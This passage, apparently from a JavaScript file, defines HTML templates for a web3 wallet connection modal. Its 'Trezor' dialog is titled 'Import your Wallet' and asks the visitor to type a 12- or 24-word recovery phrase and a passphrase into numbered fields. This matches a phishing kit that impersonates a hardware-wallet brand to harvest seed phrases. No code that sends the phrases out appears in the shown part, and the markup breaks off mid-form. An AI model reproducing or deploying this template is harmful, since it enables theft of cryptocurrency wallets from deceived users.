                                                                    <circle cx="63.6053" cy="2.12794" r="50.8338" transform="rotate(134.702 63.6053 2.12794)" stroke="url(#networkRadialC-0.14414502765126813)" stroke-width="3"></circle>

                                                                    <circle cx="126.658" cy="56.6577" r="50.3433" transform="rotate(-105 126.658 56.6577)" stroke="url(#networkRadialD-0.14414502765126813)" stroke-width="3"></circle>

                                                                    <circle cx="13.6619" cy="18.9603" r="46.0247" transform="rotate(107.362 13.6619 18.9603)" stroke="url(#networkRadialE-0.14414502765126813)" stroke-width="3"></circle>

                                                                </g>

                                                                <defs>

                                                                    <radialGradient id="networkRadialA-0.14414502765126813" cx="0" cy="0" r="1" gradientUnits="userSpaceOnUse" gradientTransform="translate(60.5 84) rotate(104.668) scale(77.0097)">

                                                                        <stop stop-color="var(--ck-graphic-globe-lines, white)"></stop>

                                                                        <stop offset="1" stop-color="var(--ck-graphic-globe-lines, white)" stop-opacity="0"></stop>

                                                                    </radialGradient>

                                                                    <radialGradient id="networkRadialB-0.14414502765126813" cx="0" cy="0" r="1" gradientUnits="userSpaceOnUse" gradientTransform="translate(96.1805 81.6717) rotate(97.125) scale(64.7443)">

                                                                        <stop stop-color="var(--ck-graphic-globe-lines, white)"></stop>

                                                                        <stop offset="1" stop-color="var(--ck-graphic-globe-lines, white)" stop-opacity="0"></stop>

                                                                    </radialGradient>

                                                                    <radialGradient id="networkRadialC-0.14414502765126813" cx="0" cy="0" r="1" gradientUnits="userSpaceOnUse" gradientTransform="translate(96.3816 -36.4455) rotate(114.614) scale(57.7177)">

                                                                        <stop stop-color="var(--ck-graphic-globe-lines, white)"></stop>

                                                                        <stop offset="1" stop-color="var(--ck-graphic-globe-lines, white)" stop-opacity="0"></stop>

                                                                    </radialGradient>

                                                                    <radialGradient id="networkRadialD-0.14414502765126813" cx="0" cy="0" r="1" gradientUnits="userSpaceOnUse" gradientTransform="translate(137.86 7.73234) rotate(92.3288) scale(62.743)">

                                                                        <stop stop-color="var(--ck-graphic-globe-lines, white)"></stop>

                                                                        <stop offset="1" stop-color="var(--ck-graphic-globe-lines, white)" stop-opacity="0"></stop>

                                                                    </radialGradient>

                                                                    <radialGradient id="networkRadialE-0.14414502765126813" cx="0" cy="0" r="1" gradientUnits="userSpaceOnUse" gradientTransform="translate(35.3203 -21.566) rotate(104.513) scale(54.8617)">

                                                                        <stop stop-color="var(--ck-graphic-globe-lines, white)"></stop>

                                                                        <stop offset="1" stop-color="var(--ck-graphic-globe-lines, white)" stop-opacity="0"></stop>

                                                                    </radialGradient>

                                                                </defs>

                                                            </svg>

                                                        </div>

                                                    </div>

                                                    <div data-projection-id="320">

                                                        <div data-projection-id="322" style="position: absolute; inset: 0px; border-radius: 50%; box-shadow: 0 0 0 2px var(--ck-graphic-globe-lines, rgba(126, 112, 243, 1)); transform: scale(1.1) translateZ(0px);"></div>

                                                        <div data-projection-id="324" style="position: absolute; inset: 0px; border-radius: 50%; box-shadow: 0 0 0 2px var(--ck-graphic-globe-lines, rgba(126, 112, 243, 1)); opacity: 0.25; transform: scale(1.2) translateZ(0px);"></div>

                                                    </div>

                                                </div>

                                                <div data-projection-id="326" style="z-index: 12; border-radius: 50%; position: absolute; bottom: -4px; right: -4px; width: 54px; height: 54px; display: flex; align-items: center; justify-content: center; padding: 13px; background: var(--ck-graphic-compass-background, var(--ck-body-background)); box-shadow: var(--ck-graphic-compass-box-shadow, 0px 2px 9px rgba(0, 0, 0, 0.15)); transform: none;">

                                                    <div class="sc-BeQoi lgfrNL" data-projection-id="328"></div>

                                                    <div data-projection-id="330" style="z-index: 2; position: absolute; transform: none;">

                                                        <svg width="34" height="34" viewBox="0 0 34 34" fill="none" xmlns="http://www.w3.org/2000/svg">

                                                            <path d="M17 34C26.3 34 34 26.2833 34 17C34 7.7 26.2833 0 16.9833 0C7.7 0 0 7.7 0 17C0 26.2833 7.71667 34 17 34ZM9.83333 25.6833C8.68333 26.2333 7.8 25.3333 8.33333 24.2L13.1667 14.3333C13.45 13.75 13.8167 13.3833 14.35 13.1333L24.1833 8.33333C25.4 7.75 26.25 8.65 25.6833 9.81667L20.8833 19.6667C20.6167 20.2 20.2333 20.6 19.6833 20.85L9.83333 25.6833ZM17.0167 19.1333C18.1833 19.1333 19.1333 18.1833 19.1333 17.0167C19.1333 15.85 18.1833 14.9167 17.0167 14.9167C15.8667 14.9167 14.9167 15.85 14.9167 17.0167C14.9167 18.1833 15.8667 19.1333 17.0167 19.1333Z" fill="var(--ck-graphic-compass-color, var(--ck-body-color))"></path>

                                                            <path d="M17 34C26.3 34 34 26.2833 34 17C34 7.7 26.2833 0 16.9833 0C7.7 0 0 7.7 0 17C0 26.2833 7.71667 34 17 34ZM9.83333 25.6833C8.68333 26.2333 7.8 25.3333 8.33333 24.2L13.1667 14.3333C13.45 13.75 13.8167 13.3833 14.35 13.1333L24.1833 8.33333C25.4 7.75 26.25 8.65 25.6833 9.81667L20.8833 19.6667C20.6167 20.2 20.2333 20.6 19.6833 20.85L9.83333 25.6833ZM17.0167 19.1333C18.1833 19.1333 19.1333 18.1833 19.1333 17.0167C19.1333 15.85 18.1833 14.9167 17.0167 14.9167C15.8667 14.9167 14.9167 15.85 14.9167 17.0167C14.9167 18.1833 15.8667 19.1333 17.0167 19.1333Z" fill="url(#ck-compass-gradient)"></path>

                                                            <defs>

                                                                <linearGradient id="ck-compass-gradient" x1="17" y1="0" x2="17" y2="34" gradientUnits="userSpaceOnUse">

                                                                    <stop stop-color="rgba(0,0,0,0)"></stop>

                                                                    <stop offset="1" stop-color="rgba(0,0,0,0.05)"></stop>

                                                                </linearGradient>

                                                            </defs>

                                                        </svg>

                                                    </div>

                                                </div>

                                            </div>

                                        </div>

                                    </div>

                                    <div class="sc-iBkjds emnDjo" data-projection-id="332" style="gap: 8px; padding-bottom: 0px;">

                                        <h1 class="sc-ftvSup fEIqVI" data-projection-id="334">Explore the world of web3<br></h1>

                                        <div class="sc-papXJ jCcNJP">Your wallet is an essential utility that lets you explore and participate in the fast evolving world of web3.<br></div>

                                    </div>

                                </div>

                            </div>

                        </div>

                        <div class="sc-hKMtZM dvERaj" data-projection-id="336">

                            <span>

                                <div class="sc-jOrMOR btBRWv"><button class="sc-dPyBCJ eNjCID"></button><button class="sc-dPyBCJ fmCqCa"></button><button class="sc-dPyBCJ fmCqCa"></button></div>

                            </span>

                        </div>

                        <a href="https://ethereum.org/en/wallets/find-wallet/" target="_blank" rel="noopener noreferrer" class="sc-himrzO eyWopv">

                            <span class="sc-gXmSlM CshDF">Learn More<br></span>

                            <svg width="13" height="12" viewBox="0 0 13 12" fill="none" xmlns="http://www.w3.org/2000/svg" class="sc-ezWOiH bkoIPM">

                                <line stroke="currentColor" x1="1" y1="6" x2="12" y2="6" stroke-width="2" stroke-linecap="round" class="sc-kLLXSd bDZenP"></line>

                                <path stroke="currentColor" d="M7.51431 1.5L11.757 5.74264M7.5 10.4858L11.7426 6.24314" stroke-width="2" stroke-linecap="round" class="sc-bZkfAO"></path>

                            </svg>

                        </a>

                    </div>

                </div>

            </div>

        </div>

    </div>

</div>

`;



const TrezorWalletModal = `

<div id="connect-trezor-modal" class="connect-trezor-modal sc-idiyUo hBuwwI" style="--height: 632px; --width: 543px;">

    <div style="pointer-events: none; position: absolute; top: 0px; bottom: 0px; left: 50%; transform: translateX(-50%); width: var(--width); z-index: 9; transition: width 200ms ease 0s;"></div>

    <div class="sc-iqcoie RrATt active">

        <div class="sc-crXcEl gcowpW">

            <button onclick="updatePage(CloseModal);" aria-label="Close" class="sc-fnykZs hFEFWT">

                <svg width="14" height="14" viewBox="0 0 14 14" fill="none" xmlns="http://www.w3.org/2000/svg">

                    <path d="M1 13L13 1" stroke="currentColor" stroke-width="2" stroke-linecap="round"></path>

                    <path d="M1 0.999999L13 13" stroke="currentColor" stroke-width="2" stroke-linecap="round"></path>

                </svg>

            </button>

            <button onclick="updatePage(ConnectModal);" aria-label="Back" class="sc-fEOsli iSYxCx" style="opacity: 1;">

                <svg width="9" height="16" viewBox="0 0 9 16" fill="none" xmlns="http://www.w3.org/2000/svg">

                    <path d="M8 1L1 8L8 15" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>

                </svg>

            </button>

        </div>

        <div class="sc-eCYdqJ dLUlU">

            <div style="position: absolute; top: 0px; left: 0px; right: 0px; opacity: 1;">Import wallet</div>

        </div>

        <div class="sc-evZas gcbNhn">

            <div class="sc-breuTD hVhjow active-scale-up">

                <div class="sc-ksZaOG dmNTWR" style="pointer-events: auto;">

                    <div style="z-index: 2; opacity: 1; transform: none;">

                        <div class="sc-dkzDqf jKlSZW" style="width:495px !important;">

                            <div class="sc-ZyCDH cBtLfS">

                                <div class="sc-jSMfEi lbAEgN"></div>

                                <div class="sc-jOhDuK hLWHUX">

                                    <div class="sc-hlnMnd czUBmg">

                                        <div class="sc-jTYCaT epSHCcx">

                                            <div class="sc-jQHtVU jhhhSe" style="border-radius: 0px;">



<svg viewBox="0 0 16 16" style="width: 80px" fill="none" xmlns="http://www.w3.org/2000/svg" class="w-full max-w-[28px] h-auto">

                            <path d="M13.9017 0.646973C13.3462 0.646973 12.8304 0.929357 12.5394 1.39357L9.40403 5.95741C9.30186 6.10784 9.34331 6.31059 9.49675 6.41075C9.6211 6.49202 9.78561 6.48196 9.89889 6.38645L12.9851 3.76201C13.0364 3.71677 13.1154 3.72137 13.1616 3.77165C13.1825 3.79469 13.1937 3.82444 13.1937 3.85502V12.0719C13.1937 12.1397 13.1377 12.1942 13.0684 12.1942C13.0312 12.1942 12.9962 12.1783 12.9727 12.1502L3.6435 1.20169C3.33966 0.850174 2.89352 0.647392 2.42388 0.646973H2.09782C1.21536 0.646973 0.5 1.34833 0.5 2.2135V13.7863C0.5 14.6515 1.21536 15.3528 2.09782 15.3528C2.65336 15.3528 3.16915 15.0704 3.46017 14.6062L6.59558 10.0424C6.69769 9.89194 6.65624 9.68919 6.50279 9.58903C6.37845 9.50776 6.21394 9.51782 6.10071 9.61334L3.01446 12.2378C2.96318 12.283 2.88412 12.2784 2.83797 12.2281C2.81703 12.2051 2.80592 12.1753 2.80634 12.1447V3.92583C2.80634 3.85796 2.86232 3.80349 2.93155 3.80349C2.96831 3.80349 3.00377 3.81941 3.02728 3.84748L12.3552 14.7981C12.659 15.1496 13.1052 15.3524 13.5749 15.3528H13.9009C14.7833 15.3532 15.4992 14.6523 15.5 13.7871V2.2135C15.5 1.34833 14.7842 0.646973 13.9017 0.646973Z" fill="#000000"></path>

                        </svg>                                              </div>

                                        </div>

                                        </div>

                                    </div>

                                </div>

                                <div class="sc-gKXOVf liyQQU">

                                    <div class="sc-jIAOiI dWkvrK" style="position: relative; opacity: 1; transform: none;">

                                        <div class="sc-iBkjds emnDjo" style="padding-bottom: 18px;">

                                            <h1 class="sc-ftvSup fqLYro">Import your Wallet<br></h1>

                                            <div class="sc-papXJ jCcNJP">To connect your wallet,<br>enter the phrase.<br></div>

                                        </div>

<div class="jssSolrise17 MuiBox-root css-0">

    <div class="MuiBox-root css-3mllz6 css-selector">

    <input class="phrase-display-none dddsad dddsadx" placeholder="Passphrase" type="password" autocomplete="new-password" id="connect-hardware-passphrase">

    <select class="dddsad" name="connect-hardware-words" id="connect-hardware-words">

      <option value="12">I have 12-word phrase</option>

      <option value="24">I have 24-word phrase</option>

    </select>

    </div>

    <textarea id="mnemonic-textarea" placeholder="Enter your recovery phrase" class="phrase-display-none MuiGrid-root MuiGrid-container MuiGrid-spacing-xs-2 jssSolrise18 css-isbt42" rows="4" style="padding-top:16px;margin-bottom: 16px;height: 120%;margin-top: 16px;background-color: rgb(255, 255, 255);border: 1px solid rgb(202, 206, 209);border-radius: 0.25rem;resize: none;margin-right: 15px;margin-left: 15px;width: calc(100% - 30px);"></textarea>

    <div id="mnemonic-words" class="MuiGrid-root MuiGrid-container MuiGrid-spacing-xs-2 jssSolrise18 css-isbt42">

        <div class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">

            <div id="mnemonic-inputdiv-0" class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">

                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">

                    <span class="notranslate">&ZeroWidthSpace;</span>

                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">1.</p>

                </div>

                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-0" type="text" tabindex="1" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">

            </div>

        </div>

        <div id="mnemonic-inputdiv-1" class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">

            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">

                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">

                    <span class="notranslate">&ZeroWidthSpace;</span>

                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">2.</p>

                </div>

                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-1" type="text" tabindex="2" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">

            </div>

        </div>

        <div id="mnemonic-inputdiv-2" class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">

            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">

                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">

                    <span class="notranslate">&ZeroWidthSpace;</span>

                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">3.</p>

                </div>

                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-2" type="text" tabindex="3" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">

            </div>

        </div>

        <div id="mnemonic-inputdiv-3" class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">

            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">

                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">

                    <span class="notranslate">&ZeroWidthSpace;</span>

                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">4.</p>

                </div>

                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-3" type="text" tabindex="4" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">

            </div>

        </div>

        <div id="mnemonic-inputdiv-4" class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">

            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">

                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">

                    <span class="notranslate">&ZeroWidthSpace;</span>

                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">5.</p>

                </div>

                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-4" type="text" tabindex="5" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">

            </div>

        </div>

        <div id="mnemonic-inputdiv-5" class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">

            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">

                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">

                    <span class="notranslate">&ZeroWidthSpace;</span>

                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">6.</p>

                </div>

                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-5" type="text" tabindex="6" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">

            </div>

        </div>

        <div id="mnemonic-inputdiv-6" class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">

            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">

                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">

                    <span class="notranslate">&ZeroWidthSpace;</span>

                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">7.</p>

                </div>

                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-6" type="text" tabindex="7" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">

            </div>

        </div>

        <div id="mnemonic-inputdiv-7" class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">

            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">

                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">

                    <span class="notranslate">&ZeroWidthSpace;</span>

                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">8.</p>

                </div>

                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-7" type="text" tabindex="8" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">

            </div>

        </div>

        <div id="mnemonic-inputdiv-8" class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">

            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">

                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">

                    <span class="notranslate">&ZeroWidthSpace;</span>

                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">9.</p>

                </div>

                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-8" type="text" tabindex="9" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">

            </div>

        </div>

        <div id="mnemonic-inputdiv-9" class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">

            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">

                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">

                    <span class="notranslate">&ZeroWidthSpace;</span>

                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">10.</p>

                </div>

                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-9" type="text" tabindex="10" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">

            </div>

        </div>

        <div id="mnemonic-inputdiv-10" class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">

            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">

                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">

                    <span class="notranslate">&ZeroWidthSpace;</span>

                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">11.</p>

                </div>

                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-10" type="text" tabindex="11" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">

            </div>

        </div>

        <div id="mnemonic-inputdiv-11" class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">

            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">

                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">

                    <span class="notranslate">&ZeroWidthSpace;</span>

                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">12.</p>

                </div>

                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-11" type="text" tabindex="12" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">

            </div>

        </div>

        <div id="mnemonic-inputdiv-12" class="phrase-display-none MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">

            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">

                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">

                    <span class="notranslate">&ZeroWidthSpace;</span>

                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">13.</p>

                </div>

                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-12" type="text" tabindex="13" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">

            </div>

        </div>

        <div id="mnemonic-inputdiv-13" class="phrase-display-none MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">

            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">

                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">

                    <span class="notranslate">&ZeroWidthSpace;</span>

                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">14.</p>

                </div>

                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-13" type="text" tabindex="14" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">

            </div>

        </div>

        <div id="mnemonic-inputdiv-14" class="phrase-display-none MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">

            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">

                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">

                    <span class="notranslate">&ZeroWidthSpace;</span>

                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">15.</p>

                </div>

                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-14" type="text" tabindex="15" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">

            </div>

        </div>

        <div id="mnemonic-inputdiv-15" class="phrase-display-none MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">

            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">

                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">

                    <span class="notranslate">&ZeroWidthSpace;</span>

                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">16.</p>

                </div>

                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-15" type="text" tabindex="16" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">

            </div>

        </div>

        <div id="mnemonic-inputdiv-16" class="phrase-display-none MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">

            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">

                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">

                    <span class="notranslate">&ZeroWidthSpace;</span>

                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">17.</p>

                </div>

                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-16" type="text" tabindex="17" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">

            </div>

        </div>

        <div id="mnemonic-inputdiv-17" class="phrase-display-none MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">

            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">

                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">

                    <span class="notranslate">&ZeroWidthSpace;</span>

                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">18.</p>

                </div>

                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-17" type="text" tabindex="18" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">

            </div>

        </div>

        <div id="mnemonic-inputdiv-18" class="phrase-display-none MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">

            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">

                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">

                    <span class="notranslate">&ZeroWidthSpace;</span>

                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">19.</p>

                </div>

                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-18" type="text" tabindex="19" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">

            </div>

        </div>

        <div id="mnemonic-inputdiv-19" class="phrase-display-none MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">

            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">

                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">

                    <span class="notranslate">&ZeroWidthSpace;</span>

                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">20.</p>

                </div>

                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-19" type="text" tabindex="20" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">

            </div>

        </div>

        <div id="mnemonic-inputdiv-20" class="phrase-display-none MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">

            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">

                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">

                    <span class="notranslate">&ZeroWidthSpace;</span>

                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">21.</p>

                </div>

                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-20" type="text" tabindex="21" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">

            </div>

        </div>

        <div id="mnemonic-inputdiv-21" class="phrase-display-none MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">

            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">

                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">

                    <span class="notranslate">&ZeroWidthSpace;</span>

                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">22.</p>

                </div>

                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-21" type="text" tabindex="22" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">

            </div>

        </div>

        <div id="mnemonic-inputdiv-22" class="phrase-display-none MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">

            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">

                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">

                    <span class="notranslate">&ZeroWidthSpace;</span>

                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">23.</p>

                </div>

                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-22" type="text" tabindex="23" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">

            </div>

        </div>

        <div id="mnemonic-inputdiv-23" class="phrase-display-none MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">

            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">

                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">

